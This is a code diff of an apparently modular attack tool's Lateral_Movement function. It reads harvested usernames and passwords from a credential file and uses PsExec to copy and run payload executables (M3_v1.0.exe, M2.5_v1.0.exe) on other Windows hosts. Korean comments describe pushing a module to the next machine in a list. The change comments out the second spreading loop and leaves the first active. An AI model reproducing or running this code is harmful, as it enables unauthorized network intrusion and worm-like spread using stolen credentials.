@@ -208,7 +208,7 @@ def Lateral_Movement():
         lines = line[0].split(".")
         return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + lists[0] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + ' -cf C:\module2\DownloadFile-main\M3_v1.0.exe')
         f.close()
-
+        '''
         # 현재 pc와 리스트의 DNS가 같을 때 리스트의 다음 DNS로 측면이동 모듈2.5 전송
         f = open('C:\module2\GetCredential\Credential_use_500.txt',
                  'r', encoding='UTF-8')
@@ -223,6 +223,7 @@ def Lateral_Movement():
                 return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + list[i+1] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + ' -cf C:\module2\DownloadFile-main\M2.5_v1.0.exe')
         f.close()
         f1.close()
+        '''
         info_List.append(('Lateral Movement', 'Ok'))
     except:
         info_List.append(('Lateral Movement', 'No'))
